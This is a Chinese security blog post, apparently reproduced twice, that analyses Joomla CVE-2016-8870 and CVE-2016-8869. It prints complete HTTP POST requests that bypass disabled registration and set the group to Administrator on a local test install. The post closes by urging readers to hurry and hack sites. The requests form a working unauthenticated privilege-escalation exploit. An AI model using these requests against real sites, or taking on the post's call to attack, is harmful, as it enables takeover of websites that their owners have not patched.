<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html lang="zh-CN">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
<title>Bendawang's Site</title>
<link href="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/font-awesome.min.css" rel="stylesheet"/>
<link href="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/screen.css" rel="stylesheet"/>
<link href="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/prism_okaidia.css" rel="stylesheet"/>
<link href="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/bendawang.css" rel="stylesheet"/>
<script src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/jquery.min.js"></script>
</head>
<body class="wrap">
<header>
<nav class="mobile-nav show-on-mobiles">
<ul>
<li class="">
<a href="/index">归档</a></li>
<li class="">
<a href="/time">时间</a></li>
<!--<li class="">
            <a href="/category">标签</a></li>-->
<li class="">
<a href="/friendlink">友链</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
<div class="show-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/bendawang.png" style="display:block;width:100%;"/></a>
</h1>
</div>
<div class="grid hide-on-mobiles">
<div class="unit test2 hide-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img alt="" height="115" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/bendawang.png" width="449"/></a>
</h1>
</div>
<nav class="main-nav unit test1 hide-on-mobiles">
<ul>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li class="">
<a href="/index">归档</a></li>
<li class="">
<a href="/time">时间</a></li>
<!--<li class="">
            <a href="/category">标签</a></li>-->
<li class="">
<a href="/friendlink">友链</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
</div>
</header>
<script>
$('document').ready(function(){
    $('li[class]:eq(4)').attr('class','current');
});
</script>
<section class="docs">
<div class="grid">
<!--移动端-->
<div class="show-on-mobiles">
<div class="article-info profile-block">
<div class="article-info-block">
               55
               <span>文章</span>
</div>
<div class="article-info-block">
               5
               <span>标签</span>
</div>
</div>
<div class="profile-block social-links">
<table>
<tbody><tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i></a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i></a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i></a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody></table>
</div>
<div class="whole show-on-mobiles">
<article class="bdw_article">
<div class="Bendawang" id="Bendawang_mobile">
<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
<div class="Bendawang_content" id="Bendawang_content_mobile"></div>

<br/>
<br/>
<h1 id="joomla">joomla未授权创建特权用户分析</h1>
<p style="max-width:100%;height:auto;">今天突然看到joomla爆出新的漏洞，个人比较感兴趣所以分析了下。
漏洞新闻：http://bobao.360.cn/learning/detail/3139.html</p>
<h1 id="1">1、漏洞影响版本</h1>
<p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">joomla 3.4.4 to 3.6.3</code>
利用<code style="max-width:100%;height:auto;">CVE-2016-8870</code>，在网站关闭注册的情况下仍可创建用户
利用<code style="max-width:100%;height:auto;">CVE-2016-8869</code>，进行提权</p>
<h1 id="2">2、漏洞复现</h1>
<h2 id="21cve20168870">2.1 利用<code style="max-width:100%;height:auto;">CVE-2016-8870</code>创建用户</h2>
<p style="max-width:100%;height:auto;">位于<code style="max-width:100%;height:auto;">components/com_users/controllers</code>下的<code style="max-width:100%;height:auto;">registration.php</code>和<code style="max-width:100%;height:auto;">user.php</code>有如下代码：
首先是<code style="max-width:100%;height:auto;">registration.php</code>下<code style="max-width:100%;height:auto;">UsersControllerRegistration</code>类的<code style="max-width:100%;height:auto;">register</code>函数的部分代码如下：
<br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161026224018099" style="max-width:100%;height:auto;"/><br/>
然后是<code style="max-width:100%;height:auto;">user.php</code>下<code style="max-width:100%;height:auto;">UsersControllerUser</code>类的<code style="max-width:100%;height:auto;">register</code>函数的完整代码如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">public function register()
{
  JSession::checkToken(&amp;apos;post&amp;apos;) or jexit(JText::_(&amp;apos;JINVALID_TOKEN&amp;apos;));
  // Get the application
  $app = JFactory::getApplication();
  // Get the form data.
  $data = $this-&gt;input-&gt;post-&gt;get(&amp;apos;user&amp;apos;, array(), &amp;apos;array&amp;apos;);
  // Get the model and validate the data.
  $model  = $this-&gt;getModel(&amp;apos;Registration&amp;apos;, &amp;apos;UsersModel&amp;apos;);
  $form = $model-&gt;getForm();
  if (!$form)
  {
     JError::raiseError(500, $model-&gt;getError());
     return false;
  }
  $return = $model-&gt;validate($form, $data);
  // Check for errors.
  if ($return === false)
  {
     // Get the validation messages.
     $errors = $model-&gt;getErrors();
     // Push up to three validation messages out to the user.
     for ($i = 0, $n = count($errors); $i &lt; $n &amp;&amp; $i &lt; 3; $i++)
     {
        if ($errors[$i] instanceof Exception)
        {
           $app-&gt;enqueueMessage($errors[$i]-&gt;getMessage(), &amp;apos;notice&amp;apos;);
           continue;
        }
        $app-&gt;enqueueMessage($errors[$i], &amp;apos;notice&amp;apos;);
     }
     // Save the data in the session.
     $app-&gt;setUserState(&amp;apos;users.registration.form.data&amp;apos;, $data);
     // Redirect back to the registration form.
     $this-&gt;setRedirect(&amp;apos;index.php?option=com_users&amp;view=registration&amp;apos;);
     return false;
  }
  // Finish the registration.
  $return = $model-&gt;register($data);
  // Check for errors.
  if ($return === false)
  {
     // Save the data in the session.
     $app-&gt;setUserState(&amp;apos;users.registration.form.data&amp;apos;, $data);
     // Redirect back to the registration form.
     $message = JText::sprintf(&amp;apos;COM_USERS_REGISTRATION_SAVE_FAILED&amp;apos;, $model-&gt;getError());
     $this-&gt;setRedirect(&amp;apos;index.php?option=com_users&amp;view=registration&amp;apos;, $message, &amp;apos;error&amp;apos;);
     return false;
  }
  // Flush the data from the session.
  $app-&gt;setUserState(&amp;apos;users.registration.form.data&amp;apos;, null);
  return true;
}
</code></pre>
<p style="max-width:100%;height:auto;">很显然的差距，就是<code style="max-width:100%;height:auto;">user.php</code>下少了这部分代码，很容易看懂，就是如果网关闭注册，那就直接跳转至<code style="max-width:100%;height:auto;">login</code>页面</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">// If registration is disabled - Redirect to login page.
if (JComponentHelper::getParams(&amp;apos;com_users&amp;apos;)-&gt;get(&amp;apos;allowUserRegistration&amp;apos;) == 0)
{
   $this-&gt;setRedirect(JRoute::_(&amp;apos;index.php?option=com_users&amp;view=login&amp;apos;, false));
   return false;
}
</code></pre>
<p style="max-width:100%;height:auto;">也就是说如果能够调用<code style="max-width:100%;height:auto;">user.php</code>下<code style="max-width:100%;height:auto;">UsersControllerUser</code>类，那么就可以用<code style="max-width:100%;height:auto;">UsersControllerUser::register()</code>这个方法来进行注册就可以绕过这个检测。</p>
<p style="max-width:100%;height:auto;">接下来模拟一下过程，joomla安装好之后默认情况下是关闭注册的，首页也没有注册的选项。
先打开注册选项，然后去注册，抓包如下（不用管那堆乱七八糟的cookie）：</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">POST /joomla/index.php/component/users/?task=registration.register HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8000/joomla/index.php/component/users/?view=registration
Cookie: Hm_lvt_6b15558d6e6f640af728f65c4a5bf687=1476171578,1476175753; bdshare_firstime=1476879802433; ck_login_id_20=1; ck_login_language_20=en_us; ck_login_theme_20=Sugar5; sYQDUGqqzHsearch_history=asdf%7C2%2Casdf%7C52%2Casdf%7C3%2Casdf%7C1; eeeaf53e25e90a39ff315452d513d988=rn180tb8srhihcgnqpo4avgtt6; 9d4bb4a09f511681369671a08beff228=gonv4bis6b1cu1f0c7mpbr2kt7; 5fdbb0240381dcfb784bf866abf180ba=khak6ckt63vlt7n116ma3ep7v1; 72ade33b26d1725575072c551da17dac=pd1k5dr7aqndmkuckl4f6umni4
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------21344283549747877901996448611
Content-Length: 1239

-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="jform[name]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="jform[username]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="jform[password1]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="jform[password2]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="jform[email1]"

Bendawang@bdw.com
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="jform[email2]"

bendawang12138@163.com
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="option"

com_users
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="task"

registration.register
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="9da03819be371b7d0c51983dcf98816f"

1
-----------------------------21344283549747877901996448611--
</code></pre>
<p style="max-width:100%;height:auto;">然后能够成功注册
<br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161026224108226" style="max-width:100%;height:auto;"/><br/>
这里观察发送的请求参数<code style="max-width:100%;height:auto;">task=registration.register</code>能够知道这里默认注册是调用的<code style="max-width:100%;height:auto;">registration.php</code>下<code style="max-width:100%;height:auto;">UsersControllerRegistration</code>类，但是我们想要调用的是<code style="max-width:100%;height:auto;">user.php</code>下<code style="max-width:100%;height:auto;">UsersControllerUser</code>
这里把后台的注册关掉，把刚才那个正常注册的号删掉。
根据代码逻辑
我们想要调用<code style="max-width:100%;height:auto;">user.php</code>下<code style="max-width:100%;height:auto;">UsersControllerUser</code>累的<code style="max-width:100%;height:auto;">register</code>方法，所以构造如下请求</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">POST /joomla/index.php/component/users/?task=registration.register HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8000/joomla/index.php/component/users/?view=registration
Cookie: Hm_lvt_6b15558d6e6f640af728f65c4a5bf687=1476171578,1476175753; bdshare_firstime=1476879802433; ck_login_id_20=1; ck_login_language_20=en_us; ck_login_theme_20=Sugar5; sYQDUGqqzHsearch_history=asdf%7C2%2Casdf%7C52%2Casdf%7C3%2Casdf%7C1; eeeaf53e25e90a39ff315452d513d988=rn180tb8srhihcgnqpo4avgtt6; 9d4bb4a09f511681369671a08beff228=gonv4bis6b1cu1f0c7mpbr2kt7; 5fdbb0240381dcfb784bf866abf180ba=khak6ckt63vlt7n116ma3ep7v1; 72ade33b26d1725575072c551da17dac=pd1k5dr7aqndmkuckl4f6umni4
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------21344283549747877901996448611
Content-Length: 1230

-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="user[name]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="user[username]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="user[password1]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="user[password2]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="user[email1]"

bendawang12138@163.com
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="user[email2]"

bendawang12138@163.com
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="option"

com_users
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="task"

user.register
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="9da03819be371b7d0c51983dcf98816f"

1
-----------------------------21344283549747877901996448611--
</code></pre>
<p style="max-width:100%;height:auto;">即把post请求参数中的所有参数名中的<code style="max-width:100%;height:auto;">jform</code>换成<code style="max-width:100%;height:auto;">user</code>
再把post请求参数中的名为<code style="max-width:100%;height:auto;">task</code>的参数由<code style="max-width:100%;height:auto;">registration.register</code>换为<code style="max-width:100%;height:auto;">user.register</code>
然后发送，截图如下，注册成功。</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161026224148716" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">以上是<code style="max-width:100%;height:auto;">CVE-2016-8870</code>漏洞的内容，只是创建一个普通用户。
接下来就是真正<code style="max-width:100%;height:auto;">CVE-2016-8869</code>的内容。
主要目的：提权!!!</p>
<h2 id="22cve20168869">2.2 利用<code style="max-width:100%;height:auto;">CVE-2016-8869</code>进行提权操作</h2>
<p style="max-width:100%;height:auto;">首先我们再看上一小节利用<code style="max-width:100%;height:auto;">CVE-2016-8870</code>注册的时候，我们使用的<code style="max-width:100%;height:auto;">user.php</code>下<code style="max-width:100%;height:auto;">UsersControllerUser</code>累的<code style="max-width:100%;height:auto;">register</code>方法的最后面有这样一句代码</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">$return = $model-&gt;register($data);
</code></pre>
<p style="max-width:100%;height:auto;">这句代码调用了<code style="max-width:100%;height:auto;">components/com_users/models/registration.php</code>下的<code style="max-width:100%;height:auto;">register</code>方法，我们来看看这个方法
<br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161026224320232" style="max-width:100%;height:auto;"/><br/>
这里只截取了一小部分，然后这里我们把<code style="max-width:100%;height:auto;">$data</code>打印如下：</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161026224302744" style="max-width:100%;height:auto;"/><br/>
由下图可以看到其实我们这个<code style="max-width:100%;height:auto;">$data</code>实际还存在一个参数是<code style="max-width:100%;height:auto;">groups</code>数组，而这个数组就决定了账户的权限。
<br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161027204404040" style="max-width:100%;height:auto;"/><br/>
这里<code style="max-width:100%;height:auto;">groups</code>的第一个值决定了账户的权限，权限列表如下。</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">1：Public
2：Registered
3：Author
4：Editor
5：Publisher
6：Manager
7：Administrator
</code></pre>
<p style="max-width:100%;height:auto;">默认情况下我们注册时<code style="max-width:100%;height:auto;">groups</code>的第一个值为2，即<code style="max-width:100%;height:auto;">Registered</code>，这里我们直接构造如下：</p>
<p style="max-width:100%;height:auto;">我们构造如下数据包</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">POST /joomla/index.php/component/users/?task=registration.register HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8000/joomla/index.php/component/users/?view=registration
Cookie: Hm_lvt_6b15558d6e6f640af728f65c4a5bf687=1476171578,1476175753; bdshare_firstime=1476879802433; ck_login_id_20=1; ck_login_language_20=en_us; ck_login_theme_20=Sugar5; sYQDUGqqzHsearch_history=asdf%7C2%2Casdf%7C52%2Casdf%7C3%2Casdf%7C1; eeeaf53e25e90a39ff315452d513d988=rn180tb8srhihcgnqpo4avgtt6; 9d4bb4a09f511681369671a08beff228=gonv4bis6b1cu1f0c7mpbr2kt7; 72ade33b26d1725575072c551da17dac=56dhrsu2p3rdefnjfktdhp8dr7; 5fdbb0240381dcfb784bf866abf180ba=vna9ecejm5rof04o1a7umbmo23
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------12126918671528593691690879232
Content-Length: 1350

-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[name]"

Bendawang
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[username]"

Bendawang
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[password1]"

Bendawang
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[password2]"

Bendawang
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[email1]"

bendawang12138@163.com
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[email2]"

bendawang12138@163.com
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[groups][]"

7
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="option"

com_users
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="task"

user.register
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="ad46184799be6e742bc96a739ac62ffa"

1
-----------------------------12126918671528593691690879232--
</code></pre>
<p style="max-width:100%;height:auto;">直接构造<code style="max-width:100%;height:auto;">Administrator</code>发包，后台观查成功注册：
<br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161026224354729" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">复现完了，趁现在赶紧日一波站啊。。。</p>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>



<!--PC端-->
<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
<div class="inner profile-inner">
<div class="base-info profile-block">
<img id="avatar" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/logo.jpg"/>
<h2 id="name" style="text-align:center">Bendawang</h2>
<span id="location" style="font-size:18px">
<i class="fa fa-map-marker"></i>SiChuan, China</span>
<a href="/about" id="follow">联系我</a></div>
<div class="article-info profile-block">
<div class="article-info-block">
        55
          <span>文章</span></div>
<div class="article-info-block">
        5
          <span>标签</span></div>
</div>
<div class="profile-block social-links hide-on-mobiles">
<table>
<tbody>
<tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i>
</a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i>
</a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i>
</a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
<div class="unit three-quarters hide-on-mobiles">
<article class="bdw_article">
<h1 id="joomla">joomla未授权创建特权用户分析</h1>
<p style="max-width:100%;height:auto;">今天突然看到joomla爆出新的漏洞，个人比较感兴趣所以分析了下。
漏洞新闻：http://bobao.360.cn/learning/detail/3139.html</p>
<h1 id="1">1、漏洞影响版本</h1>
<p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">joomla 3.4.4 to 3.6.3</code>
利用<code style="max-width:100%;height:auto;">CVE-2016-8870</code>，在网站关闭注册的情况下仍可创建用户
利用<code style="max-width:100%;height:auto;">CVE-2016-8869</code>，进行提权</p>
<h1 id="2">2、漏洞复现</h1>
<h2 id="21cve20168870">2.1 利用<code style="max-width:100%;height:auto;">CVE-2016-8870</code>创建用户</h2>
<p style="max-width:100%;height:auto;">位于<code style="max-width:100%;height:auto;">components/com_users/controllers</code>下的<code style="max-width:100%;height:auto;">registration.php</code>和<code style="max-width:100%;height:auto;">user.php</code>有如下代码：
首先是<code style="max-width:100%;height:auto;">registration.php</code>下<code style="max-width:100%;height:auto;">UsersControllerRegistration</code>类的<code style="max-width:100%;height:auto;">register</code>函数的部分代码如下：
<br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161026224018099" style="max-width:100%;height:auto;"/><br/>
然后是<code style="max-width:100%;height:auto;">user.php</code>下<code style="max-width:100%;height:auto;">UsersControllerUser</code>类的<code style="max-width:100%;height:auto;">register</code>函数的完整代码如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">public function register()
{
  JSession::checkToken(&amp;apos;post&amp;apos;) or jexit(JText::_(&amp;apos;JINVALID_TOKEN&amp;apos;));
  // Get the application
  $app = JFactory::getApplication();
  // Get the form data.
  $data = $this-&gt;input-&gt;post-&gt;get(&amp;apos;user&amp;apos;, array(), &amp;apos;array&amp;apos;);
  // Get the model and validate the data.
  $model  = $this-&gt;getModel(&amp;apos;Registration&amp;apos;, &amp;apos;UsersModel&amp;apos;);
  $form = $model-&gt;getForm();
  if (!$form)
  {
     JError::raiseError(500, $model-&gt;getError());
     return false;
  }
  $return = $model-&gt;validate($form, $data);
  // Check for errors.
  if ($return === false)
  {
     // Get the validation messages.
     $errors = $model-&gt;getErrors();
     // Push up to three validation messages out to the user.
     for ($i = 0, $n = count($errors); $i &lt; $n &amp;&amp; $i &lt; 3; $i++)
     {
        if ($errors[$i] instanceof Exception)
        {
           $app-&gt;enqueueMessage($errors[$i]-&gt;getMessage(), &amp;apos;notice&amp;apos;);
           continue;
        }
        $app-&gt;enqueueMessage($errors[$i], &amp;apos;notice&amp;apos;);
     }
     // Save the data in the session.
     $app-&gt;setUserState(&amp;apos;users.registration.form.data&amp;apos;, $data);
     // Redirect back to the registration form.
     $this-&gt;setRedirect(&amp;apos;index.php?option=com_users&amp;view=registration&amp;apos;);
     return false;
  }
  // Finish the registration.
  $return = $model-&gt;register($data);
  // Check for errors.
  if ($return === false)
  {
     // Save the data in the session.
     $app-&gt;setUserState(&amp;apos;users.registration.form.data&amp;apos;, $data);
     // Redirect back to the registration form.
     $message = JText::sprintf(&amp;apos;COM_USERS_REGISTRATION_SAVE_FAILED&amp;apos;, $model-&gt;getError());
     $this-&gt;setRedirect(&amp;apos;index.php?option=com_users&amp;view=registration&amp;apos;, $message, &amp;apos;error&amp;apos;);
     return false;
  }
  // Flush the data from the session.
  $app-&gt;setUserState(&amp;apos;users.registration.form.data&amp;apos;, null);
  return true;
}
</code></pre>
<p style="max-width:100%;height:auto;">很显然的差距，就是<code style="max-width:100%;height:auto;">user.php</code>下少了这部分代码，很容易看懂，就是如果网关闭注册，那就直接跳转至<code style="max-width:100%;height:auto;">login</code>页面</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">// If registration is disabled - Redirect to login page.
if (JComponentHelper::getParams(&amp;apos;com_users&amp;apos;)-&gt;get(&amp;apos;allowUserRegistration&amp;apos;) == 0)
{
   $this-&gt;setRedirect(JRoute::_(&amp;apos;index.php?option=com_users&amp;view=login&amp;apos;, false));
   return false;
}
</code></pre>
<p style="max-width:100%;height:auto;">也就是说如果能够调用<code style="max-width:100%;height:auto;">user.php</code>下<code style="max-width:100%;height:auto;">UsersControllerUser</code>类，那么就可以用<code style="max-width:100%;height:auto;">UsersControllerUser::register()</code>这个方法来进行注册就可以绕过这个检测。</p>
<p style="max-width:100%;height:auto;">接下来模拟一下过程，joomla安装好之后默认情况下是关闭注册的，首页也没有注册的选项。
先打开注册选项，然后去注册，抓包如下（不用管那堆乱七八糟的cookie）：</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">POST /joomla/index.php/component/users/?task=registration.register HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8000/joomla/index.php/component/users/?view=registration
Cookie: Hm_lvt_6b15558d6e6f640af728f65c4a5bf687=1476171578,1476175753; bdshare_firstime=1476879802433; ck_login_id_20=1; ck_login_language_20=en_us; ck_login_theme_20=Sugar5; sYQDUGqqzHsearch_history=asdf%7C2%2Casdf%7C52%2Casdf%7C3%2Casdf%7C1; eeeaf53e25e90a39ff315452d513d988=rn180tb8srhihcgnqpo4avgtt6; 9d4bb4a09f511681369671a08beff228=gonv4bis6b1cu1f0c7mpbr2kt7; 5fdbb0240381dcfb784bf866abf180ba=khak6ckt63vlt7n116ma3ep7v1; 72ade33b26d1725575072c551da17dac=pd1k5dr7aqndmkuckl4f6umni4
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------21344283549747877901996448611
Content-Length: 1239

-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="jform[name]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="jform[username]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="jform[password1]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="jform[password2]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="jform[email1]"

Bendawang@bdw.com
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="jform[email2]"

bendawang12138@163.com
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="option"

com_users
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="task"

registration.register
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="9da03819be371b7d0c51983dcf98816f"

1
-----------------------------21344283549747877901996448611--
</code></pre>
<p style="max-width:100%;height:auto;">然后能够成功注册
<br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161026224108226" style="max-width:100%;height:auto;"/><br/>
这里观察发送的请求参数<code style="max-width:100%;height:auto;">task=registration.register</code>能够知道这里默认注册是调用的<code style="max-width:100%;height:auto;">registration.php</code>下<code style="max-width:100%;height:auto;">UsersControllerRegistration</code>类，但是我们想要调用的是<code style="max-width:100%;height:auto;">user.php</code>下<code style="max-width:100%;height:auto;">UsersControllerUser</code>
这里把后台的注册关掉，把刚才那个正常注册的号删掉。
根据代码逻辑
我们想要调用<code style="max-width:100%;height:auto;">user.php</code>下<code style="max-width:100%;height:auto;">UsersControllerUser</code>累的<code style="max-width:100%;height:auto;">register</code>方法，所以构造如下请求</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">POST /joomla/index.php/component/users/?task=registration.register HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8000/joomla/index.php/component/users/?view=registration
Cookie: Hm_lvt_6b15558d6e6f640af728f65c4a5bf687=1476171578,1476175753; bdshare_firstime=1476879802433; ck_login_id_20=1; ck_login_language_20=en_us; ck_login_theme_20=Sugar5; sYQDUGqqzHsearch_history=asdf%7C2%2Casdf%7C52%2Casdf%7C3%2Casdf%7C1; eeeaf53e25e90a39ff315452d513d988=rn180tb8srhihcgnqpo4avgtt6; 9d4bb4a09f511681369671a08beff228=gonv4bis6b1cu1f0c7mpbr2kt7; 5fdbb0240381dcfb784bf866abf180ba=khak6ckt63vlt7n116ma3ep7v1; 72ade33b26d1725575072c551da17dac=pd1k5dr7aqndmkuckl4f6umni4
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------21344283549747877901996448611
Content-Length: 1230

-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="user[name]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="user[username]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="user[password1]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="user[password2]"

Bendawang
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="user[email1]"

bendawang12138@163.com
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="user[email2]"

bendawang12138@163.com
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="option"

com_users
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="task"

user.register
-----------------------------21344283549747877901996448611
Content-Disposition: form-data; name="9da03819be371b7d0c51983dcf98816f"

1
-----------------------------21344283549747877901996448611--
</code></pre>
<p style="max-width:100%;height:auto;">即把post请求参数中的所有参数名中的<code style="max-width:100%;height:auto;">jform</code>换成<code style="max-width:100%;height:auto;">user</code>
